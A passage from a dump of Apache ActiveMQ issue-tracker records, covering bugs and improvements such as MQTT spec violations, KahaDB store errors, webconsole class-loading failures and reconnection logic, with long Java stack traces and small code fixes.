afterRollback() throws Exception {                                           rollback();                                           synchronizationRegistered = false;                                       }                                   });                               }                    }                                                               With these modifications, we still get duplicates messages.                We think that the problem is that the statement synchronized(deliveredMessages) prevents the call of clearDeliveredList() by another ActiveMQConnection thread that clears messages in progress.                By adding logs we observe that a thread is waiting deliveredMessages ‘s lock in clearDeliveredList() method.Question :                We tried fixes described in https://issues.apache.org/jira/browse/AMQ-5068 and https://issues.apache.org/jira/browse/AMQ-3519 but it doesn’t help to solve our problem.                Is there a workaround or a config parameter that can help to prevent this problem ?                We are working on our side to find a correction. An option may be to force rolling back transaction if there is a failover during the prepare phase of commit in ConnectionStateTracker.restoreTransactions().
issueID:AMQ-5856
type:Bug
changed files:
texts:allowLinkStealing option is not working when using mqtt over websocket
A first tcp/ip connection is still alive even if a second client with the same clientId connects with allowLinkStealing as true.There is a server log as follows in this scenario.jvm 1 | WARN | Stealing link for clientId abc From Connection Transport Conn ection to: MQTTSocket_12700349 –I tested this scenario by using hivemq websocket.
issueID:AMQ-5857
type:Bug
changed files:ActiveMQTextMessage.java
texts:Message content stored twice while sending
The storeContent method in ActiveMQTextMessage does not clean text field after storing content. Therefor the message temporary exists twice which can lead to OOM problems for large or many text messages concurrently processing.
issueID:AMQ-5858
type:Bug
changed files:
texts:Error when sending message in webconsole: NoClassDefFoundError: javax/xml/bind/DatatypeConverter
Install webconsole feature in karaf and send a message using the webconsole with default values. You will see the exception below.The reason is a missing import package for javax.xml.bind.org.springframework.web.util.NestedServletException: Handler processing failed; nested exception is java.lang.NoClassDefFoundError: javax/xml/bind/DatatypeConverter at org.springframework.web.servlet.DispatcherServlet.triggerAfterCompletionWithError(DispatcherServlet.java:1260) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:939) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:851) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:953) at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:855) at javax.servlet.http.HttpServlet.service(HttpServlet.java:707) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:829) at javax.servlet.http.HttpServlet.service(HttpServlet.java:790) at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:808) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1669) at org.apache.activemq.web.AuditFilter.doFilter(AuditFilter.java:59) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1652) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:106) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1652) at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:102) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1652) at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:585) at org.ops4j.pax.web.service.jetty.internal.HttpServiceServletHandler.doHandle(HttpServiceServletHandler.java:70) at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143) at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:577) at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:223) at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1127) at org.ops4j.pax.web.service.jetty.internal.HttpServiceContext.doHandle(HttpServiceContext.java:267) at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:515) at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185) at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1061) at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141) at org.ops4j.pax.web.service.jetty.internal.JettyServerHandlerCollection.handle(JettyServerHandlerCollection.java:80) at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97) at org.eclipse.jetty.server.Server.handle(Server.java:497) at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:310) at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:257) at org.eclipse.jetty.io.AbstractConnection$2.run(AbstractConnection.java:540) at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:635) at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:555) at java.lang.Thread.run(Thread.java:745)Caused by: java.lang.NoClassDefFoundError: javax/xml/bind/DatatypeConverter at org.apache.activemq.web.WebClient.createWebClient(WebClient.java:375) at org.apache.activemq.web.WebClient.getWebClient(WebClient.java:105) at org.apache.activemq.web.controller.SendMessage.handleRequest(SendMessage.java:53) at org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter.handle(SimpleControllerHandlerAdapter.java:48) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:919) ... 35 moreCaused by: java.lang.ClassNotFoundException: javax.xml.bind.DatatypeConverter not found by org.apache.activemq.activemq-web-console &#91;62&#93; at org.apache.felix.framework.BundleWiringImpl.findClassOrResourceByDelegation(BundleWiringImpl.java:1558) at org.apache.felix.framework.BundleWiringImpl.access$400(BundleWiringImpl.java:79) at org.apache.felix.framework.BundleWiringImpl$BundleClassLoader.loadClass(BundleWiringImpl.java:1998) at java.lang.ClassLoader.loadClass(ClassLoader.java:358) ... 40 more
issueID:AMQ-5859
type:Bug
changed files:ReconnectionPolicy.java
JmsConnector.java
texts:Reconnection attempt logic seems wrong in JmsConnector#doInitializeConnection
the reconnection attempts logic  based on the reconnection policy seems wrong.In JmsConnector#doInitializeConnection the loop trying to reconnect to the foreign broker only execute once due to the erroneous test in the whilewhile (maxRetries < ++attempt && !connectionSerivce.isTerminating());should bewhile (maxRetries > ++attempt && !connectionSerivce.isTerminating());
issueID:AMQ-586
type:Bug
changed files:
texts:TwoBrokerTopicSendReceiveTest fails on some platform
On our CI test grids it works on iago, aladdin and spinach but fails on  Jafar (Windows 2003, Jdk 1.5)Tried running it on a Windows XP  box using Jdk 1.5 and it works.
issueID:AMQ-5860
type:Improvement
changed files:
texts:Encrypt connectionPassword in login,conf file when using LDAPLoginModule
Current the connectionPassword can only be clear text in login.conf file if using LDAPLoginModule. It is important to encrypt the password otherwise it will be a big security issue in some user case
issueID:AMQ-5863
type:Bug
changed files:
texts:Composite Send with useCache=false leaves messages pending till restart
With a composite send, the message id is shared across destinations so the effect of the first store is visible to subsequent stores. This results in the message store considering the second send to be async in error. The relevant state in the message id needs to be reset prior to attempting a send.It is sensible to copy the sequence Id state when a message id is copied so that acks can take advantage of the presence of the sequence id without reference to the store.
issueID:AMQ-5864
type:Bug
changed files:
texts:KahaDB recovery with persisteRedeliveryFlag=true can lead to stuck message
I send a message to queue "in" and then kill -9 the broker. After the restart, sometimes the message is lost and I can see following in broker log:Duplicate message add attempt rejected. Destination: QUEUE://in, Message id: ID:abe-ThinkPad-T430s-55936-1434452370587-1:1:1:1:1Without the <policyEntry ... persistJMSRedelivery=true/> I"m unable to reproduce this issue.
issueID:AMQ-5865
type:Bug
changed files:
texts:Enable "getRemoteAddress()" method in WebSocket Requests
The method (getRemoteAddress()) in class "org.apache.activemq.transport.ws.AbstractStompSocket" does not return the correct address; it returns always ""StompSocket_" + hashCode();" We need the correct address (e.g. "wss://127.0.0.1:63114") for our use case. The implementation whould be very simple. In class "org.apache.activemq.transport.ws.jetty8.WSServlet" (and also in jetty9 package) pass the address during creation of class StompSocket in the same package: String scheme = request.getScheme();if ("http".equalsIgnoreCase(scheme)) { scheme = "ws";} else if ("https".equalsIgnoreCase(scheme)) { scheme = "wss";  }WebSocket socket = new CustomStompSocket(scheme + "://" + request.getRemoteAddr() + ":" + request.getRemotePort());It meight be that MQTT is also affected; a fix should be done by the same way.
issueID:AMQ-5870
type:Bug
changed files:
texts:Lazy create if MQTTProtocolConverter in the WebSocket transport needs to be thread safe
The MQTT WebSocket class creates its MQTTProtocolConverter lazily which can lead to a race as the method that does this is no thread safe and the race between connection create and the send of the BrokerInfo can lead two instances getting created and a stalled connect attempt.
issueID:AMQ-5872
type:Bug
changed files:
texts:MQTT subscribe fails after unsubscribe
We have a problem subscribing after unsubscribing (same topic). The messages are put in a queue, but not delivered to the client (the queue is created on the server).We use .NET M2MQTT as our client library.Full scenario:1) Connect to server.2) Subscribe to topic "TEST"3) Publish message "TEST 1" to topic "TEST" => message is received4) Unsubscribe from topic "TEST"5) Subscribe to topic "TEST"6) Publish message "TEST 2" to topic "TEST" => message is not received7) Subscribe to topic "TEST" => message "TEST 2" is received8) Publish message "TEST 3" to topic "TEST" => message is receivedOn our server, we see the following error:2015-07-02 10:57:05,621 | WARN  | Error subscribing to TEST | org.apache.activemq.transport.mqtt.strategy.AbstractMQTTSubscriptionStrategy | ActiveMQ Transport: tcp:///10.2.6.86:56778@8884java.lang.NullPointerException at org.apache.activemq.store.kahadb.MessageDatabase.addAckLocationForRetroactiveSub(MessageDatabase.java:2220)&#91;activemq-kahadb-store-5.11.1.jar:5.11.1&#93; at org.apache.activemq.store.kahadb.MessageDatabase.updateIndex(MessageDatabase.java:1472)&#91;activemq-kahadb-store-5.11.1.jar:5.11.1&#93; at org.apache.activemq.store.kahadb.MessageDatabase$15.execute(MessageDatabase.java:1207)&#91;activemq-kahadb-store-5.11.1.jar:5.11.1&#93; at org.apache.activemq.store.kahadb.disk.page.Transaction.execute(Transaction.java:779)&#91;activemq-kahadb-store-5.11.1.jar:5.11.1&#93; at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:1204)&#91;activemq-kahadb-store-5.11.1.jar:5.11.1&#93; at org.apache.activemq.store.kahadb.MessageDatabase$10.visit(MessageDatabase.java:1103)&#91;activemq-kahadb-store-5.11.1.jar:5.11.1&#93; at org.apache.activemq.store.kahadb.data.KahaSubscriptionCommand.visit(KahaSubscriptionCommand.java:187)&#91;activemq-kahadb-store-5.11.1.jar:5.11.1&#93; at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:1070)&#91;activemq-kahadb-store-5.11.1.jar:5.11.1&#93; at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:977)&#91;activemq-kahadb-store-5.11.1.jar:5.11.1&#93; at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:957)&#91;activemq-kahadb-store-5.11.1.jar:5.11.1&#93; at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBTopicMessageStore.addSubscription(KahaDBStore.java:796)&#91;activemq-kahadb-store-5.11.1.jar:5.11.1&#93; at org.apache.activemq.store.ProxyTopicMessageStore.addSubscription(ProxyTopicMessageStore.java:98)&#91;activemq-broker-5.11.1.jar:5.11.1&#93; at org.apache.activemq.broker.region.Topic.activate(Topic.java:258)&#91;activemq-broker-5.11.1.jar:5.11.1&#93; at org.apache.activemq.broker.region.DurableTopicSubscription.add(DurableTopicSubscription.java:121)&#91;activemq-broker-5.11.1.jar:5.11.1&#93; at org.apache.activemq.broker.region.Topic.addSubscription(Topic.java:160)&#91;activemq-broker-5.11.1.jar:5.11.1&#93; at org.apache.activemq.broker.region.AbstractRegion.addConsumer(AbstractRegion.java:319)&#91;activemq-broker-5.11.1.jar:5.11.1&#93; at org.apache.activemq.broker.region.TopicRegion.addConsumer(TopicRegion.java:163)&#91;activemq-broker-5.11.1.jar:5.11.1&#93; at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:427)&#91;activemq-broker-5.11.1.jar:5.11.1&#93; at org.apache.activemq.broker.jmx.ManagedRegionBroker.addConsumer(ManagedRegionBroker.java:244)&#91;activemq-broker-5.11.1.jar:5.11.1&#93; at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:102)&#91;activemq-broker-5.11.1.jar:5.11.1&#93; at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:104)&#91;activemq-broker-5.11.1.jar:5.11.1&#93; at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:102)&#91;activemq-broker-5.11.1.jar:5.11.1&#93; at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:102)&#91;activemq-broker-5.11.1.jar:5.11.1&#93; at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:107)&#91;activemq-broker-5.11.1.jar:5.11.1&#93; at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:663)&#91;activemq-broker-5.11.1.jar:5.11.1&#93; at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:348)&#91;activemq-client-5.11.1.jar:5.11.1&#93; at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:334)&#91;activemq-broker-5.11.1.jar:5.11.1&#93; at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:188)&#91;activemq-broker-5.11.1.jar:5.11.1&#93; at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:45)&#91;activemq-client-5.11.1.jar:5.11.1&#93; at org.apache.activemq.transport.mqtt.MQTTInactivityMonitor.onCommand(MQTTInactivityMonitor.java:147)&#91;activemq-mqtt-5.11.1.jar:5.11.1&#93; at org.apache.activemq.transport.mqtt.MQTTTransportFilter.sendToActiveMQ(MQTTTransportFilter.java:106)&#91;activemq-mqtt-5.11.1.jar:5.11.1&#93; at org.apache.activemq.transport.mqtt.MQTTProtocolConverter.sendToActiveMQ(MQTTProtocolConverter.java:173)&#91;activemq-mqtt-5.11.1.jar:5.11.1&#93; at org.apache.activemq.transport.mqtt.strategy.AbstractMQTTSubscriptionStrategy.doSubscribe(AbstractMQTTSubscriptionStrategy.java:200)&#91;activemq-mqtt-5.11.1.jar:5.11.1&#93; at org.apache.activemq.transport.mqtt.strategy.MQTTDefaultSubscriptionStrategy.onSubscribe(MQTTDefaultSubscriptionStrategy.java:87)&#91;activemq-mqtt-5.11.1.jar:5.11.1&#93; at org.apache.activemq.transport.mqtt.strategy.AbstractMQTTSubscriptionStrategy.onSubscribe(AbstractMQTTSubscriptionStrategy.java:108)&#91;activemq-mqtt-5.11.1.jar:5.11.1&#93; at org.apache.activemq.transport.mqtt.MQTTProtocolConverter.onSubscribe(MQTTProtocolConverter.java:352)&#91;activemq-mqtt-5.11.1.jar:5.11.1&#93; at org.apache.activemq.transport.mqtt.MQTTProtocolConverter.onMQTTCommand(MQTTProtocolConverter.java:204)&#91;activemq-mqtt-5.11.1.jar:5.11.1&#93; at org.apache.activemq.transport.mqtt.MQTTTransportFilter.onCommand(MQTTTransportFilter.java:94)&#91;activemq-mqtt-5.11.1.jar:5.11.1&#93; at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)&#91;activemq-client-5.11.1.jar:5.11.1&#93; at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)&#91;activemq-client-5.11.1.jar:5.11.1&#93; at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)&#91;activemq-client-5.11.1.jar:5.11.1&#93; at java.lang.Thread.run(Unknown Source)&#91;:1.8.0_31&#93;
issueID:AMQ-5875
type:Bug
changed files:
texts:Removing a destination when using mKahaDB can cause an IllegalStateException
This issue occurs when using multiKahaDB and a wild card destination.  The problem is that with a wild card topic, multiple destinations can be attached to the same store.  If one of the destinations is deleted and the other destinations are empty, the entire store is deleted.  This causes an exception later on if trying to do something like subscribe to a destination that wasn"t deleted.  I"ve attached a test case to show this issue.  The problem seems to be that the removeMessageStore method in MultiKahaDBPersistenceAdapter relies on adapter.getDestinations.isEmpty() to determine whether the store is eligible for deleting.  Unfortunately, the getDestinations method in KahaDBStore excludes destinations that are empty therefore the method doesn"t return any destinations even though there is one still attached to the store so the logic goes ahead and deletes the store.The stack trace from running against 5.12.0-SNAPSHOT is below:java.lang.IllegalStateException: PageFile is not loaded        at org.apache.activemq.store.kahadb.disk.page.PageFile.assertLoaded(PageFile.java:811)        at org.apache.activemq.store.kahadb.disk.page.PageFile.tx(PageFile.java:304)        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBTopicMessageStore.getMessageCount(KahaDBStore.java:866)        at org.apache.activemq.store.ProxyTopicMessageStore.getMessageCount(ProxyTopicMessageStore.java:140)        at org.apache.activemq.store.ProxyTopicMessageStore.getMessageCount(ProxyTopicMessageStore.java:140)        at org.apache.activemq.broker.region.cursors.TopicStorePrefetch.getStoreSize(TopicStorePrefetch.java:97)        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.resetSize(AbstractStoreCursor.java:73)        at org.apache.activemq.broker.region.cursors.TopicStorePrefetch.<init>(TopicStorePrefetch.java:58)        at org.apache.activemq.broker.region.cursors.StoreDurableSubscriberCursor.add(StoreDurableSubscriberCursor.java:119)        at org.apache.activemq.broker.region.PrefetchSubscription.add(PrefetchSubscription.java:584)        at org.apache.activemq.broker.region.DurableTopicSubscription.add(DurableTopicSubscription.java:113)        at org.apache.activemq.broker.region.Topic.addSubscription(Topic.java:161)        at org.apache.activemq.broker.region.AbstractRegion.addConsumer(AbstractRegion.java:400)        at org.apache.activemq.broker.region.TopicRegion.addConsumer(TopicRegion.java:168)        at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:427)        at org.apache.activemq.broker.jmx.ManagedRegionBroker.addConsumer(ManagedRegionBroker.java:244)        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:102)        at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:107)        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:102)        at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:102)        at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:107)        at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:667)        at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:348)        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:334)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:188)        at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)        at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:300)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)        at java.lang.Thread.run(Thread.java:745)
issueID:AMQ-5876
type:Improvement
changed files:
texts:improve performance of TextFileCertificateLoginModule when many entries are in the "textfiledn.user " file
With a large number of entries ( 200,000 ) in the "org.apache.activemq.jaas.textfiledn.user" file the performance seemed to degrade. To demonstrate the performance difference;1) for 100 entries and calling initialize,login(),commit 10 times - Time taken is 73 miliseconds2) for 200,000 entries and calling initialize,login(),commit 10 times - Time taken is  5020 milisecondsSuggested improvements: avoid loading the  org.apache.activemq.jaas.textfiledn.user file each time - in PropertiesLoginModule.java, the file is only read when it changes, using the file modification time. avoid iterating through the Properties object, using a Map instead to retrieve the userName
issueID:AMQ-5878
type:Improvement
changed files:
texts:Upgrade Jackson 2.6.0
I think it can be useful to upgrade Jackson to the latest version.
issueID:AMQ-5880
type:Bug
changed files:
texts:AMQ does not accept long (>32kb) MQTT topic filters in SUBSCRIBE
Trying to send topic length 32767 works65521, 65534, 65535 do not workAMQ says:WARN | Transport Connection to: tcp://0:0:0:0:0:0:0:1:52308 failed: java.io.IOException: Unexpected error occurred: java.lang.ArrayIndexOutOfBoundsException: -1 WARN | Transport Connection to: tcp://0:0:0:0:0:0:0:1:52612 failed: java.io.IOException: Unexpected error occurred: java.lang.ArrayIndexOutOfBoundsException: -1 WARN | Transport Connection to: tcp://0:0:0:0:0:0:0:1:52625 failed: java.io.IOException: Unexpected error occurred: java.lang.ArrayIndexOutOfBoundsException: -11MQTT spec says:&#91;MQTT-4.7.3-3&#93;Topic Names and Topic Filters are UTF-8 encoded strings, they MUST NOT encode to more than 65535 bytes.
issueID:AMQ-5881
type:Bug
changed files:
texts:AMQ accepts MQTT connect with password without username
MQTT spec says:&#91;MQTT-3.1.2-22&#93;If the User Name Flag is set to 0, the Password Flag MUST be set to 0.
issueID:AMQ-5882
type:Bug
changed files:
texts:AMQ accepts MQTT PUBLISH with wildcard characters in topic
publish to topic "MQTTClient/+-[MQTTClientPublishTests" is acceptedpublish to topic "MQTTClient/#-[MQTTClientPublishTests" is acceptedMQTT spec says:&#91;MQTT-3.3.2-2&#93;The Topic Name in the PUBLISH Packet MUST NOT contain wildcard characters.
issueID:AMQ-5883
type:Bug
changed files:
texts:AMQ accepts MQTT SUBSCRIBE and UNSUBSCRIBE with no topic filters
MQTT spec says:&#91;MQTT-3.8.3-3&#93;The payload of a SUBSCRIBE packet MUST contain at least one Topic Filter / QoS pair. A SUBSCRIBE packet with no payload is a protocol violation.&#91;MQTT-3.10.3-2&#93;The Payload of an UNSUBSCRIBE packet MUST contain at least one Topic Filter. An UNSUBSCRIBE packet with no payload is a protocol violation.
issueID:AMQ-5886
type:Bug
changed files:
texts:AMQ accepts illegal MQTT protocol level (5, only 3 and 4 are defined)
MQTT spec says:&#91;MQTT-3.1.2-2&#93;The Server MUST respond to the CONNECT Packet with a CONNACK return code 0x01 (unacceptable protocol level) and then disconnect the Client if the Protocol Level is not supported by the Server.&#91;MQTT-3.2.2-5&#93;If a server sends a CONNACK packet containing a non-zero return code it MUST then close the Network Connection.
issueID:AMQ-5888
type:Bug
changed files:
texts:Transport Connection to: tcp://127.0.0.1:41062 failed: java.io.EOFException shows up in log when closing connection normally
Closing an ActiveMQConnection by calling the close() method caused the following warning message to show in the log17:59:05,384 | WARN  | org.apache.activemq.broker.TransportConnection:245 Transport Connection to: tcp://127.0.0.1:41062 failed: java.io.EOFExceptionThis exception is harmless but this WARN message appears repeatedly in the logs which is a source of false alarm.
issueID:AMQ-5889
type:New Feature
changed files:
texts:Support a single port for all wire protocols
Both Apollo and Artemis support the ability to use a single port for all protocols and to have automatic detection for the protocol being used.  It would be nice to be able to support at least a subset of this feature in the 5.x broker as well.Ideally we should at least be able to detect OpenWire, MQTT, STOMP, and AMQP over a TCP, SSL, and NIO transport.  Websockets and HTTP would be a bonus but could be more difficult to implement depending on how this could work with Jetty so that would take some investigation.This is especially useful in environments where having to open up several new ports can be difficult because of firewall and security restrictions.
issueID:AMQ-5890
type:Bug
changed files:
texts:AMQP: possible NPE when handling disposition with Modified state
If a consumer sends a disposition with Modified state in which the "deliveryFailed" field is not populated, the broker will NPE. This is because the relevant value is a Boolean object rather than boolean primitive. That appears to be because there is actually no default value specified for the field in the specification, and it is defined only to be set when delivery actually failed (values that are not set are encoded nulls in the AMQP frame).The implementation needs updated to handle this value being null, but will be left permissive of it being set false.
issueID:AMQ-5891
type:Bug
changed files:UnmodifiableSession.java
pom.xml
UnmodifiableTransport.java
UnmodifiableDelivery.java
UnmodifiableLink.java
UnmodifiableConnection.java
texts:AMQP: update to proton-j 0.10
We should upgrade to proton-j 0.10 once released.I will attach a patch with the changes needed to update the tests for the latest snapshots.
issueID:AMQ-5892
type:Improvement
changed files:
texts:Unnecessary stack trace in case of authorization failure
The following stack trace is printed when the authorization exception occurs:2015-06-25 08:37:12,697 [ActiveMQ NIO Worker 42] WARN Service - Async error occurred: java.lang.SecurityException: User bla is not authorized to read from: topic://xxx at org.apache.activemq.security.AuthorizationBroker.addConsumer(AuthorizationBroker.java:155) at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:102) at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:102) at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:107) at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:107) at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:667) at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:348) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:334) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:188) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:45) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:300) at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:97) at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:200) at org.apache.activemq.transport.stomp.ProtocolConverter.onStompSubscribe(ProtocolConverter.java:664) at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258) at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.stomp.StompCodec.processCommand(StompCodec.java:129) at org.apache.activemq.transport.stomp.StompCodec.parse(StompCodec.java:100) at org.apache.activemq.transport.stomp.StompNIOTransport.serviceRead(StompNIOTransport.java:112) at org.apache.activemq.transport.stomp.StompNIOTransport.access$000(StompNIOTransport.java:44) at org.apache.activemq.transport.stomp.StompNIOTransport$1.onSelect(StompNIOTransport.java:69) at org.apache.activemq.transport.nio.SelectorSelection.onSelect(SelectorSelection.java:97) at org.apache.activemq.transport.nio.SelectorWorker$1.run(SelectorWorker.java:119) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:745)In keeping with logging transport exceptions, it makes sense to only log the stack trace at debug level.
issueID:AMQ-5893
type:Bug
changed files:
texts:Individual Ack Session with Message Audit in play can detect false positive duplicates
When connected via a failover transport the connection enables its ConnectionAudit by default to filter duplicates.  For messages consumed using a consumer created from a Session in Individual Acknowledgement mode the unacknowledged messages are not removed from the message audit when the consumer is closed.  If a new consumer is opened on that same connection on the same destination the previously delivered messages get tagged as duplicates and are poisoned ack"d.
issueID:AMQ-5895
type:Bug
changed files:
texts:FilteredDestinations do not work when loaded by runtimeConfigurationPlugin
When adding a FilteredDestination to VirtualDestinations in activemq.xml, the runtimeConfigurationPlugin will not update the configuration correct for the filteredDestination. The log does not give any errors until we send a message towards the CompositeTopic/Queue that contains the FilteredDestination, then the message is not forwarded and the following error is written in the log:java.lang.IllegalArgumentException: Unknown mapped destination type java.lang.Object@7a141450        at org.apache.activemq.broker.region.virtual.CompositeDestination.getMappedDestinations(CompositeDestination.java:124)[activemq-broker-5.11.1.jar:5.11.1] It works if we restart activeMQ, because then the configuration is not loaded by the runtimeConfigurationPlugin, however we really want to avoid that.Solution: It seems that the translation from JAXB objects to ActiveMQ objects is not translating DtoFilteredDestination to FilteredDestinations in org.apache.activemq.plugin.JAXBUtils.When I added the following code to the method "inferTargetObject", then the problem was solved:        } else if (DtoFilteredDestination.class.isAssignableFrom(elementContent.getClass())) {            return new FilteredDestination();Why this matters: In my organisation we really like to use ActiveMQ VirtualDestinations with FilteredDestinations, because it is a much more minimalistic than having to make many simple subscriptions in Camel and it has many benefits compared to durable subscribers. However, we do not wish to restart ActiveMQ every time we modify the VirtualDestinations, hence we need to be able to updated the VirtualDestinations using runtimeConfigurationPlugin and this does not work right now due to this bug.I have added some files to this issue: a patch file, a full stacktrace and some steps to reproduce the problem.Perhaps I can also commit the bug fix myself if that can speed up the process.
issueID:AMQ-5896
type:Bug
changed files:
texts:Problem getting jmx queue when another is deleting during request
When calling RemoteJMXBrokerFacade to get information on a queue, but while doing this another queue can be removed, leaving the method to throw an exception:Caused by: java.lang.reflect.UndeclaredThrowableException at com.sun.proxy.$Proxy228.getName(Unknown Source) at org.apache.activemq.web.BrokerFacadeSupport.getDestinationByName(BrokerFacadeSupport.java:131) at org.apache.activemq.web.BrokerFacadeSupport.getQueue(BrokerFacadeSupport.java:118) ... 3 moreCaused by: javax.management.InstanceNotFoundException: org.apache.activemq:type=Broker,brokerName=localhost,destinationType=Queue,destinationName=20150720083000_82a7f1c6-2eb9-11e5-9d34-0242ac110091 at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.getMBean(DefaultMBeanServerInterceptor.java:1095) at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.getAttribute(DefaultMBeanServerInterceptor.java:643) at com.sun.jmx.mbeanserver.JmxMBeanServer.getAttribute(JmxMBeanServer.java:678) at javax.management.remote.rmi.RMIConnectionImpl.doOperation(RMIConnectionImpl.java:1464) at javax.management.remote.rmi.RMIConnectionImpl.access$300(RMIConnectionImpl.java:97) at javax.management.remote.rmi.RMIConnectionImpl$PrivilegedOperation.run(RMIConnectionImpl.java:1328) at javax.management.remote.rmi.RMIConnectionImpl.doPrivilegedOperation(RMIConnectionImpl.java:1420) at javax.management.remote.rmi.RMIConnectionImpl.getAttribute(RMIConnectionImpl.java:657) at sun.reflect.GeneratedMethodAccessor27.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:322) at sun.rmi.transport.Transport$2.run(Transport.java:202) at sun.rmi.transport.Transport$2.run(Transport.java:199) at java.security.AccessController.doPrivileged(Native Method) at sun.rmi.transport.Transport.serviceCall(Transport.java:198) at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:567) at 